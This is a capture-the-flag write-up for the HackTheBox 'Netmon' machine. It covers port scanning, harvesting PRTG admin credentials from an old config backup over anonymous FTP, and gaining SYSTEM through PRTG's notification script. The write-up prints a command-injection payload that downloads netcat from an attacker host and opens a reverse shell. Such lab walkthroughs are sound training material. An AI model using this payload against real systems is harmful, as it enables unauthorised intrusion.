---
description: Netmon box from HackTheBox write up.
---

# Netmon

## Nmap

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -v -p- --min-rate 1000 <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 20:36 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.051s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 43.70 seconds
           Raw packets sent: 65787 (2.895MB) | Rcvd: 65537 (2.622MB)
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 -sC -sV <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 20:41 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.051s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-25T00:42:04
|_  start_date: 2021-09-25T00:34:22

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.46 seconds
```

Ok those are a lot of ports, let's start for the promising ones. Even though the FTP server allows anonymous access to the root volume I want to check the web server first.

## Port 80

Looks like a network monitor thing with a login page. The service is called PRTG Network Monitor and the installed version is 18.1.37.13946. I found a RCE exploit for it in `searchsploit` but we need the admin credentials for it. 

Lets use the FTP server to take a look and see if we can get what we need.

## Port 21

After looking around, I found this in the `/ProgramData/Paessler/PRTG Network Monitor/PRTG Configuration.old.bak` file:

```xml
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
 </dbpassword>
```

This credentials didn't worked but since this was an old file... maybe chaning the date... like... `prtgadmin:PrTg@dmin2019`? Well actually worked!

Once we have access as admin to the panel, maybe we can exploit this somehow. After searching a bit, I found something that can lead to a reverse shell.

## Foothold and system

First, we can go to Setup / Account Settings / My Account / Notifications and then add a new alarm. Then, we have to search for the 'Execute Program' option and select the PowerShell notifications demo script.

In the application version used by the machine, this demo script is vulnerable to command injection. In the parameter field we have to put this:

```powershell
test.txt; powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<ATACKER_IP>:8000/nc64.exe','C:\Users\Public\nc64.exe'); C:\Users\Public\nc64.exe -e C:\Windows\System32\cmd.exe <ATACKER_IP> 8080"
```

Now we can save the changes, check this new notification and click the option to send it. After doing that, while having a listener and hosting a web server with a compatible `netcat` binary for the victim machine, we would get a reverse shell!


```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [<ATACKER_IP>] from (UNKNOWN) [<MACHINE_IP>] 50677
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

And we are already `system`! We can get the flag under `C:\Users\Administrator\Desktop\root.txt`
